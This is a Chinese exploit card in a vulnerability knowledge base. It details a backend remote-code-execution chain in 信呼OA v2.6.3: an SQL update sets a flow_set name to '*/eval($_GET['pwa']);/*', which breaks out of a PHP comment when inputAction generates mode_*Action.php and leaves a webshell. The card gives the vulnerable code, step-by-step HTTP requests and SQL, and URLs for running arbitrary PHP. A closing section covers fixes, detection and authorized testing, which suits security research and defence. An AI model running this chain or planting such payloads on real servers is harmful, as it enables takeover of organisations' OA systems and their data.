---
id: web-php-rce-xinhu-flowaction-inputaction-generated-mode-file-comment-breakout
title: 信呼OA v2.6.3 flowAction::inputAction 用 flow_set 的 name/num 生成 mode_*Action.php：注释闭合注入 eval 直接 RCE
type: scenario
domain: web
path: web/php/rce
technique: xinhu-flowaction-inputaction-generated-mode-file-comment-breakout
aliases:
- 信呼OA 后台 getshell
- flowAction inputAction
- mode_test123Action.php
- flow_set name 注入
- createtxt 生成 PHP 文件
- 注释闭合 eval
- 信呼 OA v2.6.3 RCE
tags:
- web
- php
- xinhu
- oa
- rce
- code-injection
- file-write
- comment-breakout
- backend
- cve-less
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: v2.6.3（原文标记：测试版本，最新版）
verification:
  verified_by: verifier-V305
  verified_at: '2026-11-08T11:50:45+08:00'
  notes: 已对照原文核对：flowAction inputAction 生成 webmain/flow/input/mode_<num>Action.php、flow_set 的 num/name 拼入模板、name 位于块注释用 */eval($_GET['pwa']);/* 闭合、createtxt 落盘、setid 强转 int；利用链 图08-16（新增流程模块 id=163、openkqj headpic 上传 JSON、huifdatanew 执行 createsql、inputAction 回显 payload、mode_test123Action.php phpinfo、flow_set 列表第4行）均与正文一致。修正：原文 xssrepstr 字符表不含 /，已改卡片表述；关联卡链接改为实际 ID web-php-rce-xinhu-oa-copymode-file-write。dedup 与 copymode 卡为 related（cos 0.893），不同端点/sink；dup-scan 与 qcloudcos run 上传 RCE 为 related，非同一链，均保留。affected_versions 按原文“测试版本 v2.6.3（最新版）”保留。未验证点：未在本机复现；原文前台 SQL 拿 token 部分未展开；生成文件依赖目录可写与直接解析。无 sources/source_url。
---

## 一句话结论

信呼OA v2.6.3 的 `webmain/main/flow/flowAction.php::inputAction` 在 `webmain/flow/input/mode_<num>Action.php` 不存在时，会把数据库 `flow_set` 行的 `$modenum` 和 `$rs['name']` 直接拼进 PHP 模板并用 `rock->createtxt()` 落盘；`name` 未转义且位于块注释里，把它改成 `*/eval($_GET['pwa']);/*` 就能闭合注释，访问生成的 `mode_test123Action.php?pwa=phpinfo();` 执行任意 PHP，形成后台 RCE。

## 原理

- **触发点**：`inputAction()` 先 `$setid = (int)$this->get('setid','0')`（强制 int，不能在这里注入），再 `$rs = m('flow_set')->getone("`id`='$setid'")` 取流程模块配置；`$modenum` 来自该行（模块编号 `num`）。
- **路径与自动建文件**：
  ```php
  $apaths = ''.P.'/flow/input/mode_'.$modenum.'Action.php';
  $apath  = ''.ROOT_PATH.'/'.$apaths.'';
  if(!file_exists($apath)){
      $stra = '<?php
  /**
  *   此文件是流程模块【'.$modenum.'.'.$rs['name'].'】对应控制器接口文件。
  */
  class mode_'.$modenum.'ClassAction extends inputAction{
      protected function savebefore($table, $arr, $id, $addbo){}
      protected function saveafter($table, $arr, $id, $addbo){}
  }';
      $this->rock->createtxt($apaths, $stra);
  }
  ```
  `$modenum` 与 `$rs['name']` 都来自数据库，字符串拼接进 PHP 源码且没有转义；`createtxt` 把内容写到 Web 根下的 `webmain/flow/input/`，该目录可直接被 PHP 解析。
- **注释闭合**：模板把 `$rs['name']` 放在 `/** ... */` 块注释中。把 `name` 设为 `*/eval($_GET['pwa']);/*`，生成的文件变成：
  ```php
  /**
  *   此文件是流程模块【test123.*/eval($_GET['pwa']);/*】对应控制器接口文件。
  */
  class mode_test123ClassAction extends inputAction{ ... }
  ```
  `*/` 提前结束注释，`eval($_GET['pwa'])` 作为顶层 PHP 代码执行，后面的 `/*` 再把剩余模板注释掉；直接访问该文件即触发，不需要走框架路由。
- **为什么需要先控制数据库**：后台“新增流程模块”的 `flowsetsavebefore` 会对 `name`/`num` 做 `xssrepstr`（去掉 `(`,`)`,`*`,`<`,`>`、`\`、空格等；不含 `/`）和 `num` 规则校验（非纯数字、长度 ≥4、无中文、无 `-`），`*/eval()` 中的 `*`、`(`、`)` 会被过滤，不能从 UI 直接写入。因此需要先用 SQL 执行原语（如备份恢复 `createsql`，见关联卡）把 `flow_set.name` 更新为 payload；`num` 保持合法的 `test123`，用于生成文件名。
- **可达性**：`inputAction` 属于后台流程录入接口；本文链路要求已取得后台会话（原文称前台 SQL 注入拿 token 进后台，未展开），并在 `adminid=1` 条件下使用备份恢复。

## 触发条件

- 目标为信呼OA v2.6.3（原文测试版本，最新版）。
- 已有后台会话，且能访问 `flow/main/flowAction.php::inputAction`（`/index.php?a=input&m=flow&d=main&id=0&setid=<id>`）。
- 已能控制 `flow_set` 行的 `name`（通过 SQL 注入/备份恢复等）与合法的 `num`；目标文件 `webmain/flow/input/mode_<num>Action.php` 尚不存在（存在则不会重建，需换 num 或删除）。
- Web 目录可写，`createtxt` 有权限创建文件；PHP 直接解析 `webmain/flow/input/` 下的文件。

## 利用步骤

1. **创建正常流程模块**：后台“流程模块列表 → 新增”，类型/模块名/模块编号（如 `test123`）/对应主表等填合法值提交；记录返回的 `id`（原文为 163）。对应请求为 `POST /index.php?p=save&m=mode_flowset|input&d=flow&ajaxbool=true`，响应 `{"code":200,"data":163,"success":true}`。
2. **把 name 改成 payload**：用备份恢复任意 SQL（关联卡）执行
   `update xinhu_flow_set set name="*/eval($_GET['pwa']);/*" where id=163;`
   原文通过 `createsql` 完成，避开 `xssrepstr` 对 `*/`、`()` 的过滤。
3. **触发建文件**：`GET /index.php?a=input&m=flow&d=main&id=0&setid=163`，页面会显示 `*/eval($_GET['pwa']);/*`，同时 `webmain/flow/input/mode_test123Action.php` 被写入。
4. **访问 shell**：`/webmain/flow/input/mode_test123Action.php?pwa=phpinfo();`（或 `/?d=flow&m=mode_test123|input&pwa=phpinfo();`），`pwa` 参数进入 `eval`，执行任意 PHP。
5. 若页面提示“无法创建文件”，检查 `webmain/flow/input/` 权限、`open_basedir`、`P`/`ROOT_PATH` 常量与 `num` 是否合法；若文件已存在，换一个 `num` 或先删除。

## PoC

正常创建流程模块（原文请求，节选）：

```http
POST /index.php?p=save&m=mode_flowset|input&d=flow&ajaxbool=true&rnd=213273 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=0&sxuanfileid=&type=5&name=test123123&num=test123&tables=test123&...&sysmodeid=157&sysmodenum=flowset
```

响应：

```json
{"code":200,"msg":"...","data":163,"success":true}
```

把名字改成 payload 的 SQL（由备份恢复执行，见关联卡）：

```sql
update xinhu_flow_set set name="*/eval($_GET['pwa']);/*" where id=163;
```

触发与访问：

```http
GET /index.php?a=input&m=flow&d=main&id=0&setid=163 HTTP/1.1
```

```text
GET /webmain/flow/input/mode_test123Action.php?pwa=phpinfo();
# 或
GET /?d=flow&m=mode_test123|input&pwa=phpinfo();
```

原文实测返回 PHP 7.3.4 的 phpinfo 页面，证明生成的 PHP 文件被直接解析执行。

## 变体与关联

- **同产品的其它文件写入 RCE**：[[web-php-rce-xinhu-oa-copymode-file-write]] 是 copymode 把 `name` 拼进 PHP 代码后访问 `Model.php` 执行；[[web-php-rce-xinhu-copymode-get-defined-vars-av-bypass]] 是写马被 AV 拦截后的免杀变体。本卡是 flowAction 自动生成 `mode_*Action.php` 的新 sink。
- **SQL 执行原语**：[[web-generic-sqli-xinhu-beifen-huifdatanew-createsql-arbitrary-sql]]（备份恢复 `createsql`）用于改 `flow_set.name`；也可用其它 SQL 注入点达到同样目的。
- **可控文件名写入原语**：[[web-generic-file-upload-xinhu-openkqj-headpic-controlled-filename-write]]（`openkqj` headpic 写 `kqj<snid>_u<uid>.jpg`）用于放置备份 JSON，是本链的前置。
- **同产品 SQL 注入**：[[web-generic-sqli-xinhu-getmfilv-fname-base64-insert]]、[[web-generic-sqli-xinhu-openbase-querydata-basemodenum-initbase]]、[[web-generic-sqli-xinhu-base64-filter-bypass-admin-actions]] 等，可用于获取后台/数据库控制。
- **边界**：需要后台权限与数据库写能力；`inputAction` 的 `setid` 为 int，不能直接注入；生成文件依赖 `webmain/flow/input/` 可写且可被 Web 访问；`num` 必须通过保存时的格式校验（非数字、≥4 位、无中文/`-`）；不同版本路径/过滤可能变化。

## 检测与防御

- **代码修复**：生成 PHP 文件时不要把数据库字段直接拼进源码；对 `name`/`num` 做严格白名单（`[a-z0-9_]{4,32}`）并在写入前转义/拒绝 `*/`、`<?`、`?>`；更好的做法是不动态生成 PHP 文件，改用固定控制器 + 配置表。
- **文件监控**：监控 `webmain/flow/input/mode_*Action.php` 的新增/修改，尤其是包含 `eval`、`$_GET`、`assert` 的文件；Web 目录设为不可写（除必要上传目录）。
- **SQL 与备份**：备份恢复接口只允许 `adminid=1` 且校验备份签名/表名白名单（见关联卡）；禁止 `createsql` 执行任意 SQL。
- **检测**：审计 `flow_set` 表中 `name` 含 `*/`、`eval`、`$_GET` 的异常行；监控 `inputAction` 后紧跟对 `mode_*Action.php` 的访问；WAF 拦截 `pwa=` 等参数直接访问生成文件。
- **合规**：仅在授权环境复现；不要在生产 OA 上写文件/执行命令。
